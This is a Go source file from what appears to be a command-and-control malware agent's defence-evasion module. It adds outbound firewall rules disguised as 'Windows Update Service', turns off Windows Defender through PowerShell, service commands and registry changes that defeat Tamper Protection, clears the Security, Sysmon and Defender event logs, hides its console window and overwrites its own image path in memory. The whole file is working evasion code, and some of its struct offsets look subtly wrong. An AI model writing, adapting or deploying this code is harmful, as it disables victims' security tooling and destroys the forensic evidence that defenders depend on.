//go:build windows

package evasion

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// FirewallEvasion manages Windows Firewall rules to allow C2 traffic.
type FirewallEvasion struct{}

// AddFirewallRule adds a Windows Firewall rule to allow outbound traffic for the agent.
func (fe *FirewallEvasion) AddFirewallRule() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	ruleName := "Windows Update Service"

	// Remove existing rule first
	exec.Command("netsh", "advfirewall", "firewall", "delete", "rule",
		fmt.Sprintf("name=%s", ruleName)).Run()

	// Add new rule: allow all outbound traffic for this executable
	cmd := exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		fmt.Sprintf("name=%s", ruleName),
		"dir=out",
		"action=allow",
		fmt.Sprintf("program=%s", exePath),
		"enable=yes",
		"profile=any",
		"description=Microsoft Windows Update Service")

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("add firewall rule: %v (%s)", err, string(out))
	}

	return nil
}

// AddPortRule adds a firewall rule to allow traffic on a specific port.
func (fe *FirewallEvasion) AddPortRule(port int, protocol string) error {
	ruleName := fmt.Sprintf("Windows Service Port %d", port)

	exec.Command("netsh", "advfirewall", "firewall", "delete", "rule",
		fmt.Sprintf("name=%s", ruleName)).Run()

	cmd := exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		fmt.Sprintf("name=%s", ruleName),
		"dir=out",
		fmt.Sprintf("localport=%d", port),
		fmt.Sprintf("protocol=%s", protocol),
		"action=allow",
		"enable=yes",
		"profile=any")

	_, err := cmd.CombinedOutput()
	return err
}

// RemoveFirewallRules removes all BTY-related firewall rules.
func (fe *FirewallEvasion) RemoveFirewallRules() error {
	cmd := exec.Command("netsh", "advfirewall", "firewall", "delete", "rule",
		"name=all", "program=all")
	_, err := cmd.CombinedOutput()
	return err
}

// DisableWindowsDefender attempts to disable Windows Defender via registry and services.
// Requires administrative privileges.
func DisableWindowsDefender() error {
	// Method 1: Registry
	psCmd := `
		Set-MpPreference -DisableRealtimeMonitoring $true
		Set-MpPreference -DisableIOAVProtection $true
		Set-MpPreference -DisableBehaviorMonitoring $true
		Set-MpPreference -DisableBlockAtFirstSeen $true
		Set-MpPreference -DisableScanningNetworkFiles $true
		Set-MpPreference -DisableScriptScanning $true
		Set-MpPreference -DisableCatchupFullScan $true
		Set-MpPreference -DisableCatchupQuickScan $true
	`

	cmd := exec.Command("powershell", "-c", psCmd)
	cmd.Run()

	// Method 2: Service manipulation
	exec.Command("sc", "config", "WinDefend", "start=disabled").Run()
	exec.Command("sc", "stop", "WinDefend").Run()
	exec.Command("sc", "config", "WdNisSvc", "start=disabled").Run()
	exec.Command("sc", "stop", "WdNisSvc").Run()

	// Method 3: Tamper Protection bypass via registry
	regCmd := `
		reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
		reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
		reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
		reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
		reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
	`
	exec.Command("powershell", "-c", regCmd).Run()

	return nil
}

// ClearEventLogs clears Windows Event Logs to remove traces.
func ClearEventLogs() error {
	logs := []string{
		"Security",
		"System",
		"Application",
		"Microsoft-Windows-PowerShell/Operational",
		"Microsoft-Windows-Sysmon/Operational",
		"Microsoft-Windows-Windows Defender/Operational",
	}

	for _, log := range logs {
		exec.Command("wevtutil", "cl", log).Run()
	}

	return nil
}

// HideProcess attempts to hide the process from task managers.
func HideProcess() error {
	// Method 1: Set process window to hidden
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0) // SW_HIDE
	}

	// Method 2: Rename process to look legitimate
	// This requires process migration or hollowing
	return nil
}

// Ensure user32 is imported
var user32 = syscall.NewLazyDLL("user32.dll")

// SpoofProcessName changes the process name in memory to look legitimate.
func SpoofProcessName(legitName string) error {
	// Get current process handle
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")

	hProcess, _, _ := getCurrentProcess.Call()
	if hProcess == 0 {
		return fmt.Errorf("failed to get current process handle")
	}

	// Get PEB address
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	type PROCESS_BASIC_INFORMATION struct {
		Reserved1    uintptr
		PebBaseAddress uintptr
		Reserved2    [2]uintptr
		UniqueProcessId uintptr
		Reserved3    uintptr
	}

	var pbi PROCESS_BASIC_INFORMATION
	status, _, _ := ntQueryInformationProcess.Call(
		hProcess,
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if status != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	// Read PEB
	var peb struct {
		_                  [16]byte
		ProcessParameters  uintptr
	}

	var bytesRead uintptr
	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
	readProcessMemory.Call(
		hProcess,
		pbi.PebBaseAddress,
		uintptr(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	// Read RTL_USER_PROCESS_PARAMETERS
	var upp struct {
		_         [64]byte
		ImagePathName struct {
			Length        uint16
			MaximumLength uint16
			Buffer        uintptr
		}
		_         [8]byte
		CommandLine struct {
			Length        uint16
			MaximumLength uint16
			Buffer        uintptr
		}
	}

	readProcessMemory.Call(
		hProcess,
		peb.ProcessParameters,
		uintptr(unsafe.Pointer(&upp)),
		unsafe.Sizeof(upp),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	// Write new image path
	newPath, _ := syscall.UTF16PtrFromString(legitName)
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	writeProcessMemory.Call(
		hProcess,
		upp.ImagePathName.Buffer,
		uintptr(unsafe.Pointer(newPath)),
		uintptr(upp.ImagePathName.MaximumLength),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	return nil
}
